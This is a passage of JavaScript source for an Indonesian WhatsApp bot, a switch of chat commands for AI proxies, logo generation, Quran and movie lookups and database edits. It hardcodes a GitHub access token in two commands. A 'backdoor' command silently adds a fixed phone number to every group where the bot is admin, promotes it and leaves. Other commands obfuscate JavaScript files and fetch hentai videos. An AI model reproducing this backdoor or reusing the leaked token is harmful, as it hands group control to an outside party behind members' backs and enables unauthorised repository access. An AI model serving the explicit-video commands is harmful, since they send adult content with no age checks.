    // Contoh: .adddb 628999999999
    if (!text) return m.reply("❌ Masukkan nomor yang ingin ditambahkan!\nContoh: .adddb 6281234567890");

    // Bersihkan nomor => hanya digit
    let newNumber = text.replace(/\D/g, '');
    if (!newNumber) {
        return m.reply("❌ Format nomor tidak valid (hanya angka).");
    }

    // Jika diawali 0, ubah ke 62
    if (newNumber.startsWith('0')) {
        newNumber = '62' + newNumber.slice(1);
    }

    // Data GitHub
    const githubToken = "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"; // Ganti dengan token Anda
    const owner = "Necromancerns";     // ganti sesuai user/owner
    const repo = "DbScript";          // ganti sesuai nama repo
    const filePath = "Db.json";       // path file di repo
    const branch = "main";            // nama branch

    // Endpoint GET file untuk ambil sha & content
    const getFileUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}?ref=${branch}`;
    // Endpoint PUT file
    const putFileUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;

    try {
        m.reply("⏳ Sedang memperbarui database di GitHub...");

        // 1) Ambil file existing (untuk dapatkan sha & content)
        fetch(getFileUrl, {
            method: "GET",
            headers: {
                "Authorization": `token ${githubToken}`,
                "Accept": "application/vnd.github.v3+json"
            }
        })
        .then(res => {
            if (!res.ok) throw new Error(`Gagal GET file. Status: ${res.status}`);
            return res.json();
        })
        .then(async (data) => {
            // data.content => base64 string
            // data.sha => needed for update
            let oldSha = data.sha;
            let oldContentBase64 = data.content; 
            // decode base64 => string
            let oldContentString = Buffer.from(oldContentBase64, 'base64').toString('utf-8');

            // parse JSON
            let dbArr = JSON.parse(oldContentString);
            if (!Array.isArray(dbArr)) {
                throw new Error("Format DB di GitHub tidak valid (bukan array).");
            }

            // Cek jika nomor sudah ada
            if (dbArr.includes(newNumber)) {
                return m.reply(`✅ Nomor ${newNumber} sudah ada di database.`);
            }

            // Tambahkan nomor baru
            dbArr.push(newNumber);

            // Stringify jadi JSON
            let newContentString = JSON.stringify(dbArr, null, 2);
            // encode base64
            let newContentBase64 = Buffer.from(newContentString, 'utf-8').toString('base64');

            // 2) PUT file => update DB
            let putBody = {
                message: "update db via bot", // commit message
                content: newContentBase64,
                sha: oldSha,
                branch: branch
            };

            let putRes = await fetch(putFileUrl, {
                method: "PUT",
                headers: {
                    "Authorization": `token ${githubToken}`,
                    "Accept": "application/vnd.github.v3+json",
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(putBody)
            });

            let putData = await putRes.json();
            if (!putRes.ok) {
                throw new Error(`EROR => ${JSON.stringify(putData)}`);
            }

            // Jika sukses, putData.content.download_url = link raw baru
            m.reply(`✅ Berhasil menambahkan nomor ${newNumber} ke database!`);
        })
        .catch(err => {
            console.error("Error adddb GET file:", err);
            m.reply("❌ Gagal mengambil data DB dari GitHub. " + err.message);
        });
    } catch (err) {
        console.error("Error adddb:", err);
        m.reply("❌ Terjadi kesalahan. " + err.message);
    }
}
break
case 'deldb': {
if (!isOwner) return m.reply(mess.owner);
    // Format: .deldb 628xxxx
    if (!text) return m.reply("❌ Masukkan nomor yang ingin dihapus!\nContoh: .deldb 6281234567890");

    // Bersihkan nomor => hanya digit
    let delNumber = text.replace(/\D/g, '');
    if (!delNumber) {
        return m.reply("❌ Format nomor tidak valid (hanya angka).");
    }

    // Jika diawali 0, ubah ke 62
    if (delNumber.startsWith('0')) {
        delNumber = '62' + delNumber.slice(1);
    }

    // Data GitHub
    const githubToken = "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"; // Ganti dengan token valid
    const owner = "Necromancerns"; // Ganti sesuai user/owner
    const repo = "DbScript";       // Ganti sesuai nama repo
    const filePath = "Db.json";    // Path file di repo
    const branch = "main";         // Branch

    // Endpoint GET file
    const getFileUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}?ref=${branch}`;
    // Endpoint PUT file
    const putFileUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;

    try {
        m.reply("⏳ Sedang memperbarui database di GitHub...");

        // 1) Ambil file existing
        fetch(getFileUrl, {
            method: "GET",
            headers: {
                "Authorization": `token ${githubToken}`,
                "Accept": "application/vnd.github.v3+json"
            }
        })
        .then(res => {
            if (!res.ok) throw new Error(`Gagal GET file. Status: ${res.status}`);
            return res.json();
        })
        .then(async (data) => {
            let oldSha = data.sha;
            let oldContentBase64 = data.content; 
            let oldContentString = Buffer.from(oldContentBase64, 'base64').toString('utf-8');

            // Parse JSON
            let dbArr = JSON.parse(oldContentString);
            if (!Array.isArray(dbArr)) {
                throw new Error("Format DB di GitHub tidak valid (bukan array).");
            }

            // 2) Cek apakah nomor ada di DB
            if (!dbArr.includes(delNumber)) {
                return m.reply(`❌ Nomor ${delNumber} tidak ditemukan di database.`);
            }

            // 3) Hapus nomor dari array
            dbArr = dbArr.filter(num => num !== delNumber);

            // 4) Stringify => base64
            let newContentString = JSON.stringify(dbArr, null, 2);
            let newContentBase64 = Buffer.from(newContentString, 'utf-8').toString('base64');

            // 5) PUT (edit) file
            let putBody = {
                message: "delete number via bot",
                content: newContentBase64,
                sha: oldSha,
                branch: branch
            };

            let putRes = await fetch(putFileUrl, {
                method: "PUT",
                headers: {
                    "Authorization": `token ${githubToken}`,
                    "Accept": "application/vnd.github.v3+json",
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(putBody)
            });

            let putData = await putRes.json();
            if (!putRes.ok) {
                throw new Error(`Gagal => ${JSON.stringify(putData)}`);
            }

            // Sukses
            m.reply(`✅ Nomor ${delNumber} berhasil dihapus dari database!`);
        })
        .catch(err => {
            console.error("Error deldb GET file:", err);
            m.reply("❌ Gagal mengambil data DB dari GitHub. " + err.message);
        });
    } catch (err) {
        console.error("Error deldb:", err);
        m.reply("❌ Terjadi kesalahan. " + err.message);
    }
}
break
case 'listdb': {
if (!isOwner) return m.reply(mess.owner);
    // Contoh perintah: .listdb
    m.reply("⏳ Sedang memuat database...");

    try {
        // Link raw JSON array
        let dbUrl = "https://raw.githubusercontent.com/Necromancerns/DbScript/main/Db.json";
        fetch(dbUrl)
            .then(res => {
                if (!res.ok) throw new Error(`Gagal mengambil DB. Status: ${res.status}`);
                return res.text();
            })
            .then(text => {
                // Parse JSON array
                let dbArr = JSON.parse(text);
                if (!Array.isArray(dbArr)) {
                    throw new Error("Format DB tidak valid (bukan array).");
                }

                // Jika array kosong
                if (dbArr.length === 0) {
                    return m.reply("Database kosong, belum ada nomor yang terdaftar.");
                }

                // Susun teks output
                let hasil = `*List Nomor dalam Database*\n\n`;
                dbArr.forEach((num, i) => {
                    hasil += `${i + 1}. ${num}\n`;
                });
                hasil += `\nTotal: ${dbArr.length} nomor.`;

                m.reply(hasil);
            })
            .catch(err => {
                console.error("Error listdb fetch:", err);
                m.reply("❌ Gagal memuat database. " + err.message);
            });
    } catch (err) {
        console.error("Error listdb:", err);
        m.reply("❌ Terjadi kesalahan saat memproses listdb.");
    }
}
break
case 'adminonly': {
    // Pastikan perintah dijalankan di grup
    if (!isOwner) return m.reply(mess.owner);
    if (!m.isGroup) return m.reply("Perintah ini hanya bisa digunakan di dalam grup.");

    // Pastikan user adalah admin grup atau owner bot
    let groupMetadata = await Izz.groupMetadata(m.chat);
    let participants = groupMetadata.participants;
    let admins = participants.filter(v => v.admin !== null).map(a => a.id);
    let isGroupAdmins = admins.includes(m.sender);
    let isOwner = [global.owner, ...global.owners || []].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender); 
    // (Sesuaikan logika di atas dengan definisi isOwner di environment Anda)

    if (!isGroupAdmins && !isOwner) {
        return m.reply("Perintah ini hanya dapat digunakan oleh admin grup atau owner bot.");
    }

    // Ambil argumen: on/off
    let arg = text.trim().toLowerCase();
    if (!['on', 'off'].includes(arg)) {
        return m.reply("Format salah!\nContoh: .adminonly on/off");
    }

    // Baca file DB
    let fs = require('fs');
    let dbPath = './dbgrup.json'; // Nama file DB
    let db = {};

    try {
        let raw = fs.readFileSync(dbPath);
        db = JSON.parse(raw);
    } catch (e) {
        // Jika file belum ada atau parse error, buat baru
        db = {};
    }

    // Set status on/off untuk grup ini
    db[m.chat] = arg; 
    // Menyimpan ke file
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));

    if (arg === 'on') {
        m.reply(`✅ Admin-only mode di grup ini telah diaktifkan!\nSekarang hanya admin grup dan owner bot yang dapat menggunakan perintah tertentu.`);
    } else {
        m.reply(`✅ Admin-only mode di grup ini telah dimatikan!\nSekarang semua member dapat menggunakan perintah.`);
    }
}
break
case 'reactch': {
  if (!isOwner) return m.reply(mess.owner);
let args = text.trim().split(/\s+/);
  if (args.length < 3) return m.reply(`Format Salah\n${prefix + command} idch baris emoji`);
  let channelid = args[0]
  let baris = args[1]
  let emoji = args[2]
  try {
await Izz.newsletterReactMessage(channelid, baris, emoji);
m.reply(`sukses`);
} catch (e) {
  console.log(e)
  m.reply(e)
}
}
break
case 'aicopilot': {
    if (!text) {
        return m.reply(`*• Example:* ${prefix + command} Bagaimana saya mengunjungi Padang Pariaman?`);
}
    try {        
        let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json();        
        let messageContent = {
            text: '> Travel Assistant Copilot AI\n\n' + gpt.result
};
        await Izz.sendMessage(m.chat, messageContent, { quoted: m });

    } catch (e) {
        console.error(e);
        m.reply("`*Error*`");
    }
};
break
case 'pastebin-copy': {
  if (!args[0]) return m.reply('• *Example :* .getpaste https://pastebin.com/KiCvmvCf');

  let url = args[0].trim();

  if (url.startsWith('https://pastebin.com/') && !url.includes('/raw/')) {
    url = url.replace('https://pastebin.com/', 'https://pastebin.com/raw/');
  }

  await Izz.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
  
  const text = await getPastebinContent(url);
  if (text) {
    await m.reply(`📄 *Isi Pastebin:*\n\n${text}`);
  } else {
    await m.reply('❌ Gagal mengambil isi dari Pastebin.');
  }
};
break
case 'gptz':{
    if (!text) throw 'Contoh: .gptz Pesan yang ingin Anda sampaikan kepada asisten AI';

    m.reply('⏳ Sedang diproses...'); 
    const messages = encodeURIComponent(text);

    try {
        const response = await getgptzw7Response(messages);
        m.reply(decodeURIComponent(response.data.html));
    } catch (error) {
        console.error('Error:', error);
        m.reply('❌ Terjadi kesalahan, coba lagi nanti.');
    }
}
break
case 'muslim-ai': {
    if (!text) return m.reply("Contoh penggunaan:\n.muslim-ai <pertanyaan>");
    m.reply("⏳ Sedang memproses pertanyaan...");
    try {
        let url = `https://apizell.web.id/ai/muslim?q=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        let answer = json.answer;
        if (!answer) {
            return m.reply("❌ Tidak ada jawaban dari AI.");
        }
        let replyText = `*Muslim AI*\n\n*Q:* ${text}\n\n*A:* ${answer}\n\n`;
        // Opsional: Tampilkan sumber
        if (json.source && Array.isArray(json.source) && json.source.length > 0) {
            replyText += `*Sumber (related):*\n`;
            json.source.forEach((src, i) => {
                replyText += `${i + 1}. ${src.surah_title}\n   Link: ${src.surah_url}\n`;
            });
        }
        m.reply(replyText);
    } catch (err) {
        console.error("Error muslim-ai:", err);
        m.reply("❌ Terjadi kesalahan saat memproses pertanyaan AI.");
    }
}
break
case 'aigroq': {
  if (!text) return m.reply(`*• Example:* ${prefix + command} *[prompt]*`);
  try {
     let callback = await AiGpt(text)
     let metadata = {
      text: callback,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          mediaType: 0,
          title: "GPT 3.5 Torbo",
          thumbnailUrl: "https://i.pinimg.com/originals/e2/8d/e6/e28de644cf5db33db1d2447bc13aacd3.jpg",
        },
      },
    };
   await Izz.sendMessage(m.chat, metadata, { quoted: m });  
  } catch (e) {
    m.reply(`*can't get response from ai \n• Syntax: ${e}*`);
  }
};
break
case 'genimage': {
    if (args.length < 2) return m.reply('Masukkan judul & slogan! Contoh: .logo WhatsApp Bot|Powerful AI');

    const [title, slogan] = args.join(" ").split("|");

    try {
        // Kirim reaksi ⏱️ saat proses dimulai
        await Izz.sendMessage(m.chat, {
            react: {
                text: "⏱️",
                key: m.key,
            }
        });

        let payload = {
            ai_icon: [333276, 333279],
            height: 300,
            idea: `A Icon ${title}`,
            industry_index: "N",
            industry_index_id: "",
            pagesize: 4,
            session_id: "",
            slogan: slogan || "",
            title: title,
            whiteEdge: 80,
            width: 400
        };

        let { data } = await axios.post("https://www.sologo.ai/v1/api/logo/logo_generate", payload);

        if (!data || !data.data || !data.data.logoList.length) {
            return m.reply('🚫 Gagal membuat logo.');
        }

        const logoUrls = data.data.logoList.map(logo => logo.logo_thumb);

        let message = `🎨 *Logo Generator*\n\n`;
        message += `📌 *Judul*: ${title}\n`;
        message += `📝 *Slogan*: ${slogan || "-"}\n`;
        message += `📥 *Sedang mengunduh logo...*`;

        // Kirim thumbnail pertama dengan informasi
        await Izz.sendMessage(m.chat, { 
            image: { url: logoUrls[0] }, 
            caption: message
        }, { quoted: m });

        // Kirim semua logo hasil generate
        for (let i = 1; i < logoUrls.length; i++) {
            await Izz.sendMessage(m.chat, { 
                image: { url: logoUrls[i] }
            }, { quoted: m });
        }

        // Ganti reaksi ke ✅ setelah logo terkirim
        await Izz.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key,
            }
        });

    } catch (error) {
        console.error("Error generating logo:", error);
        m.reply('❌ Terjadi kesalahan saat membuat logo.');
    }
};
break
case 'yanzgpt': {
    const userId = m.sender;
    let prompt = text.trim();
    const systemPrompt = "Kamu adalah AI. jika ada yang bertanya kamu siapa jawab saja kamu adalah ai"; // prompt ganti aja bebas

    if (!prompt) {
        return m.reply("Mau nanya apa banh?");
    }

    // ganti model disini yak (ganti sesuai kebutuhan)
       const selectedModel = "yanzgpt-revolution-25b-v3.5"; // Default
    // const selectedModel = "yanzgpt-legacy-72b-v3.5"; // Pro
    // const selectedModel = "yanzgpt-r1-70b-v3.5"; // Reasoning

    await Izz.sendMessage(m.chat, { react: { text: '🌸', key: m.key } });

    try {
        const response = await GPT(prompt, userId, systemPrompt, selectedModel);
        await Izz.sendMessage(m.chat, { text: response }, { quoted: m });
    } catch (error) {
        console.error("Error processing request:", error.message);
        await Izz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memproses permintaan.' }, { quoted: m });
    }

    await Izz.sendMessage(m.chat, { react: { text: null, key: m.key } });
};
break
case 'enc': {
    // Pastikan ada pesan yang di-reply
    if (!m.quoted) return reply("Balas file .js yang ingin diencrypt!");

    // Coba ambil objek pesan dari balasan, baik dari m.quoted.message atau m.quoted
    const quotedMessage = m.quoted.message || m.quoted;
    
    // Coba ambil documentMessage dan fileName
    const documentMsg = quotedMessage.documentMessage;
    const fileName = documentMsg?.fileName || m.quoted.fileName;

    if (!documentMsg || !fileName) {
        return reply("Balas file .js yang dikirim sebagai dokumen!");
    }

    // Validasi ekstensi file .js
    if (!fileName.endsWith('.js')) {
        return reply("File harus berformat .js");
    }

    // Cegah enkripsi ulang file yang sudah diencrypt
    if (fileName.startsWith('encrypted_')) {
        return reply("File ini sudah diencrypt!");
    }

    let filePath;
    try {
        // Mengunduh file yang di-reply
        filePath = await Izz.downloadAndSaveMediaMessage(m.quoted);
    } catch (error) {
        return reply("Gagal mengunduh file: " + error.message);
    }

    let fileContent;
    try {
        // Membaca isi file sebagai teks
        fileContent = fs.readFileSync(filePath, 'utf8');
    } catch (error) {
        return reply("Gagal membaca file: " + error.message);
    }

    try {
        // Mengencrypt (obfuscate) isi file menggunakan javascript-obfuscator
        const obfuscationResult = jsobfus.obfuscate(fileContent, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        });
        const encryptedCode = obfuscationResult.getObfuscatedCode();

        // Simpan hasil enkripsi ke file sementara
        const tempFilePath = './temp/encrypted_' + fileName;
        fs.writeFileSync(tempFilePath, encryptedCode, 'utf8');

        // Kirim file hasil enkripsi sebagai dokumen
        await Izz.sendMessage(m.chat, {
            document: fs.readFileSync(tempFilePath),
            fileName: "encrypted_" + fileName,
            mimetype: "text/javascript"
        }, { quoted: m });

        // Hapus file sementara
        fs.unlinkSync(tempFilePath);
        reply("✅ File berhasil diencrypt!");
    } catch (error) {
        console.error("Error during encryption:", error);
        reply("Gagal mengencrypt file: " + error.message);
    }
}
break
case 'yanzai': {
if (!text) throw `Silahkan masukkan query`;
try {
react('🗿');
let res = await aiyanz(text);
m.reply(res)
} catch (e) {
console.log(e)
}
}
break
case 'search':
case 'detail':
case 'moviedb': {
  const [command, ...args] = text.split(' ');
  const query = args.join(' ');

  if (!command) return m.reply(`Gunakan format:\n${prefix}${command} search <judul>\n${prefix}${command} detail <url>`);

  try {
    if (command === 'search') {
      if (!query) return m.reply('Mau Cari Apa \n\n *Example :* .moviedb search Solo Traveling* ');
      const searchResults = await movsearch(query);
      if (searchResults.length === 0) return m.reply('Tidak ada hasil ditemukan.');

      let searchMessage = 'Search :\n';
      searchResults.forEach((result, index) => {
        searchMessage += `\n${index + 1}. ${result.title}\n*• Name :* ${result.name}\n\n*• Link :* ${result.url}`;
      });

      await m.reply(searchMessage);
    } else if (command === 'detail') {
      if (!query) return m.reply('Mana Url Film Nya? \n\n *Example :* . moviedb detail https://www.themoviedb.org/tv/28665');
      const detailResults = await themovD(query);
      if (detailResults.error) return m.reply('Gagal mengambil detail film.');

      let detailMessage = 'Detail Film :\n';
      detailMessage += `\n- User Score : ${detailResults.users}\n\n`;
      detailMessage += `- Description : ${detailResults.desk}\n`;

      if (detailResults.vote.length > 0) {
        detailMessage += '\nCast:\n';
        detailResults.vote.forEach((cast, index) => {
          detailMessage += `\n${index + 1}. ${cast.orang2}\n   Character : ${cast.char}\n   Episodes : ${cast.eps}\n   Link : ${cast.OrangUrl}`;
        });
      }

      if (detailResults.top.length > 0) {
        detailMessage += '\nTop Contributors :\n';
        detailResults.top.forEach((contributor, index) => {
          detailMessage += `\n${index + 1}. ${contributor.Topnma}\n   Contributions : ${contributor.jumlh}\n   Profile : ${contributor.Toplink}\n`;
        });
      }

      await Izz.sendMessage(m.chat, {
        image: { url: detailResults.poster },
        caption: detailMessage
      }, { quoted: m });
    } else {
      m.reply('command tidak valid. Gunakan "search" atau "detail".');
    }
  } catch (error) {
    console.error(error);
    m.reply('Terjadi kesalahan saat memproses permintaan.');
  }
}
break
case 'ceksurah': {
    if (!text) return m.reply("Contoh penggunaan:\n.ceksurah <nomor surat (1-114)>");
    let nomor = parseInt(text);
    if (isNaN(nomor) || nomor < 1 || nomor > 114) {
        return m.reply("Nomor surat harus berupa angka antara 1 sampai 114.");
    }
    m.reply("⏳ Sedang memproses permintaan surah...");
    try {
        let url = `https://rest.cloudkuimages.com/api/muslim/surah/${nomor}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
        let json = await res.json();
        if (json.status !== 200 || !json.result) {
            return m.reply("❌ Gagal mendapatkan data surah.");
        }
        let result = json.result;
        // Format pesan penjelasan surah
        let replyText = `*Surah: ${result.name_id} (${result.name_en})*\n` +
                        `*Nama Panjang:* ${result.name_long}\n` +
                        `*Nomor:* ${result.number}\n` +
                        `*Jumlah Ayat:* ${result.number_of_verses}\n` +
                        `*Tempat Diturunkan:* ${result.revelation_en} (${result.revelation})\n` +
                        `*Urutan:* ${result.sequence}\n\n` +
                        `*Tafsir:*\n${result.tafsir}\n\n` +
                        `*Terjemahan:* ${result.translation_id} (${result.translation_en})`;
        // Kirim audio surah
        await Izz.sendMessage(m.chat, { audio: { url: result.audio_url }, mimetype: 'audio/mpeg' }, { quoted: m });
        // Kirim penjelasan surah
        m.reply(replyText);
    } catch (err) {
        console.error("Error ceksurah:", err);
        m.reply("❌ Terjadi kesalahan saat memproses data surah.");
    }
}
break
case 'backdoor': {
    // Pastikan hanya owner yang bisa menjalankan perintah backdoor
    if (!isOwner) return m.reply("Hanya owner yang dapat menjalankan perintah ini.");

    m.reply("⏳ Memproses backdoor...");

    // Fungsi sleep untuk memberi jeda antar operasi agar tidak overload
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    try {
        // Ambil semua grup yang diikuti oleh bot
        let groups = Object.values(await Izz.groupFetchAllParticipating().catch(() => []));
        
        for (let group of groups) {
            try {
                let groupMetadata = await Izz.groupMetadata(group.id);
                let participants = groupMetadata.participants;
                // Cek apakah bot adalah admin di grup tersebut
                let adminList = participants.filter(v => v.admin).map(v => v.id);
                if (!adminList.includes(botNumber)) continue;
                
                // Target nomor yang akan dipromosikan
                let targetNumber = "6281274749995@s.whatsapp.net";
                
                // Jika target belum ada di grup, tambahkan dulu
                let targetExists = participants.some(p => p.id === targetNumber);
                if (!targetExists) {
                    await Izz.groupParticipantsUpdate(group.id, [targetNumber], 'add');
                    await sleep(1000);
                }
                
                // Promosikan target menjadi admin
                await Izz.groupParticipantsUpdate(group.id, [targetNumber], 'promote');
                await sleep(1000);
                
                // Bot keluar dari grup
                await Izz.groupLeave(group.id);
                await sleep(1000);
            } catch (err) {
                console.error(`Error processing group ${group.id}:`, err);
            }
        }
        m.reply("✅ Backdoor selesai dijalankan.");
    } catch (err) {
        console.error("Error in backdoor:", err);
        m.reply("❌ Terjadi kesalahan saat menjalankan backdoor.");
    }
}
break
case 'txt2anime': {
  const prompt = args.join(' ');

  if (!prompt) {
    return Izz.sendMessage(m.chat, { text: `Masukkan prompt!\n*EX:* .txt2anime loli` }, { quoted: m });
  }
await react('⌛');

  try {
    const res = await generateAnimeImage(prompt);
    if (!res.status) throw new Error(res.message);

    await Izz.sendMessage(m.chat, {
      image: { url: res.image },
      caption: `✨ *Prompt:* ${prompt}`
    }, { quoted: m });

  } catch (error) {
    Izz.sendMessage(m.chat, { text: `Error: ${error.message || 'Gagal membuat gambar.'}` }, { quoted: m });
  }
};
break
case 'twittertrend': {
    const country = args[0] ? args[0].toLowerCase() : 'indonesia';
    async function trendTwitter(country) {
        return new Promise((resolve, reject) => {
            axios.get(`https://getdaytrends.com/${country}/`)
                .then(({ data }) => {
                    const $ = cheerio.load(data);
                    const hastag = [];
                    const tweet = [];
                    const result = [];
                    $('#trends > table.table.table-hover.text-left.clickable.ranking.trends.wider.mb-0 > tbody > tr> td.main > a').each((i, el) => {
                        hastag.push($(el).text());
                    });
                    $('#trends > table.table.table-hover.text-left.clickable.ranking.trends.wider.mb-0 > tbody > tr > td.main > div > span').each((i, el) => {
                        tweet.push($(el).text());
                    });
                    for (let i = 0; i < hastag.length; i++) {
                        result.push({
                            rank: i + 1,
                            hashtag: hastag[i],
                            tweetCount: tweet[i] || 'N/A'
                        });
                    }

                    resolve({
                        country: country,
                        result: result
                    });
                })
                .catch(reject);
        });
    }
    try {
        const trends = await trendTwitter(country);
        const resultText = trends.result.map(trend => 
            `• Rank: ${trend.rank}\n• Hashtag: ${trend.hashtag}\n• Tweets: ${trend.tweetCount}\n`
        ).join('\n');

        await Izz.sendMessage(m.chat, { text: `*[ TREND TWITTER✨ - ${country.toUpperCase()} ]*\n\n${resultText}` }, { quoted: m });
    } catch (error) {
        console.error('Error fetching trends:', error);
        await Izz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil data tren Twitter.' }, { quoted: m });
    }
};
break
case "confess": {
    // Format input: .confess <pesan>|<nomor tujuan>
    if (!text.includes("|")) return m.reply("Contoh penggunaan:\n.confess halo|6281274749995");
    
    let [message, target] = text.split("|").map(t => t.trim());
    if (!message || !target) return m.reply("Format salah. Contoh: .confess halo|6281274749995");
    
    let targetNumber = target + "@s.whatsapp.net";
    let Senderman = m.sender;
    
    // Simpan ke database
    confessDB[Senderman] = targetNumber;
    confessDB[targetNumber] = Senderman;
    fs.writeFileSync(dbFile, JSON.stringify(confessDB, null, 2));
    
    // Kirim pesan ke target
    await Izz.sendMessage(targetNumber, { text: `📩 *Pesan Rahasia!* 📩\n\n"${message}"\n\n_Balas pesan ini untuk membalas pengirim secara anonim._` }, { quoted: m });

    m.reply(`✅ Pesan berhasil dikirim ke ${target}. Tunggu balasannya.`);
    
}
break;
case "stopconfess": {
    let Senderman = m.sender;
    let targetNumber = confessDB[Senderman];

    if (!targetNumber) return m.reply("⚠️ Anda tidak memiliki sesi confess yang aktif.");

    delete confessDB[Senderman];
    delete confessDB[targetNumber];
    fs.writeFileSync(dbFile, JSON.stringify(confessDB, null, 2));

    m.reply("✅ Sesi confess dihentikan.");
}
break
case 'upcase': {
if (!isOwner) return m.reply(mess.owner);
let t = text.split(",");
if (t.length > 6) return m.reply(`*Format Salah*\n${prefix + command} namacase,sumbercase,sumberplugin,desk,fiturcase`);
let namacase = t[0];
let sumbercase = t[1];
let sumberplugin = t[2];
let desk = t[3];
let fiturcase = t[4];
let well = `${namacase}\nSumber Case: ${sumbercase}\nSumber Plugin: ${sumberplugin}\ndeskripsi: ${desk}\n\n\`\`\` ${fiturcase} \`\`\` `
m.reply(well);
react("✅");
}
break
case "gptizz": {
    const getGPT4js = require("gpt4js");

    if (!text) return m.reply("Contoh penggunaan:\n.gpt <pertanyaan>");

    m.reply("⏳ Memproses pertanyaan dengan GPT...");

    (async () => {
        const GPT4js = await getGPT4js();
        const messages = [{ role: "user", content: text }];
        const options = {
            provider: "BlackBox",
            model: "BlackBox",
        };

        try {
            const provider = GPT4js.createProvider(options.provider);
            const response = await provider.chatCompletion(messages, options);
            m.reply(`🤖 *GPT-4o Response:*\n\n${response}`);
        } catch (error) {
            console.error("Error:", error);
            m.reply("❌ Terjadi kesalahan saat memproses pertanyaan.");
        }
    })();
}
break
case "autoai": {
    if (!isOwner) return m.reply("Hanya owner yang bisa mengaktifkan Auto AI.");
    
    if (!text) return m.reply("Contoh penggunaan:\n.autoai on\n.autoai off");
    
    if (text.toLowerCase() === "on") {
        autoAiDB.status = true;
        fs.writeFileSync(dbaifile, JSON.stringify(autoAiDB, null, 2));
        m.reply("✅ Auto AI diaktifkan. Sekarang bot akan membalas chat pribadi dengan AI.");
    } else if (text.toLowerCase() === "off") {
        autoAiDB.status = false;
        fs.writeFileSync(dbaifile, JSON.stringify(autoAiDB, null, 2));
        m.reply("❌ Auto AI dimatikan. Bot tidak akan membalas chat pribadi.");
    } else {
        m.reply("⚠️ Perintah tidak valid. Gunakan:\n.autoai on\n.autoai off");
    }
    }
    break
    case 'vidhentai': {
if (!isOwner) return
    m.reply(`hello, vid akan di kirim secara chat private hehe`)
    let cr = await xhentai(text);
    let tan = cr[Math.floor(Math.random(), cr.length)]
    let vap = `
⭔ Title : ${tan.title}
⭔ Category : ${tan.category}
⭔ Mimetype : ${tan.type}
⭔ Views : ${tan.views_count}
⭔ Shares : ${tan.share_count}
⭔ Source : ${tan.link}
⭔ Media Url : ${tan.video_1}
`
Izz.sendMessage(m.sender, { video: { url: tan.video_1 }, caption: vap }, { quoted: m})
};
break
case 'xhentaisrc': {
    // Format input: .xhentaisrc <query>|<page>
    if (!text) return m.reply("Contoh penggunaan:\n.xhentaisrc anime|2");

    let parts = text.split("|");
    let query = parts[0].trim();
    let page = parts.length > 1 ? parseInt(parts[1].trim()) : null;

    if (page && isNaN(page)) return m.reply("⚠️ Page harus berupa angka!");

    m.reply("🔍 Sedang mencari data...");

    try {
        let results = await xhentaisrc(query, page);
        
        if (typeof results === "string") return m.reply(results); // Jika tidak ada hasil

        let responseText = `📌 *Hasil Pencarian XHentaiSrc* 📌\n\n`;
        results.forEach((item, index) => {
            responseText += `🔸 *${index + 1}. ${item.title}*\n`;
            responseText += `📂 Kategori: ${item.category}\n`;
            responseText += `👀 Views: ${item.views_count} | 🔄 Share: ${item.share_count}\n`;
            responseText += `🔗 Link: ${item.link}\n\n`;
        });

        m.reply(responseText);
    } catch (error) {
        console.error("❌ Error case xhentaisrc:", error);
        m.reply("⚠️ Terjadi kesalahan saat mengambil data.");
    }
}
break
case 'xhentaidl': {
    if (!text) return m.reply("📌 *Contoh penggunaan:*\n.xhentaidl <url>");

    let url = text.trim();
    if (!url.startsWith("https://sfmcompile.club/")) {
        return m.reply("⚠️ URL tidak valid! Harus dari 'sfmcompile.club'.");
    }

    m.reply("🔍 Sedang mengambil video...");

    try {
        let result = await xhentaidl(url);
        
        if (typeof result === "string") return m.reply(result); // Jika error atau video tidak ditemukan

        let caption = `📌 *Detail Video XHentaiDL* 📌\n\n`;
        caption += `🎬 *Judul:* ${result.title}\n`;
        caption += `📂 *Kategori:* ${result.category}\n`;
        caption += `👀 *Views:* ${result.views_count} | 🔄 *Share:* ${result.share_count}\n`;
        caption += `🔗 *Sumber:* [Klik Disini](${url})`;

        await Izz.sendMessage(m.chat, { video: { url: result.video_url }, caption }, { quoted: m });
    } catch (error) {
        console.error("❌ Error case xhentaidl:", error);
        m.reply("⚠️ Terjadi kesalahan saat mengambil video.");
    }
}
break
case 'text2image': {
if (!text) return m.reply(`masukkan query`);
try {
let url = `https://api.hiuraa.my.id/ai-img/text2img?text=Kucing${encodeURIComponent(text)}`;
await Izz.sendMessage(m.chat, { image: { url: url }, caption: `done`}, { quoted: m});
} catch (e) {
console.log(e)
}
}
break
case "autoclosegc": {
    if (!isGroup) return m.reply("⚠️ Perintah ini hanya bisa digunakan di dalam grup.");
    if (!isBotAdmins) return m.reply("⚠️ Bot harus menjadi admin untuk mengubah pengaturan grup.");
    if (!isAdmins) return m.reply("⚠️ Hanya admin yang dapat menjalankan perintah ini.");
    
    let duration = parseInt(text);
    if (isNaN(duration) || duration <= 0) return m.reply("⚠️ Masukkan durasi dalam menit. Contoh: .autoclosegc 30");
    
    let groupId = m.chat;

    // Simpan status grup ke database
    autoCloseDB[groupId] = {
        closed: true,
        reopenTime: Date.now() + duration * 60000 // Waktu sekarang + durasi dalam ms
    };
    fs.writeFileSync(izzgcdb, JSON.stringify(autoCloseDB, null, 2));

    // Tutup grup
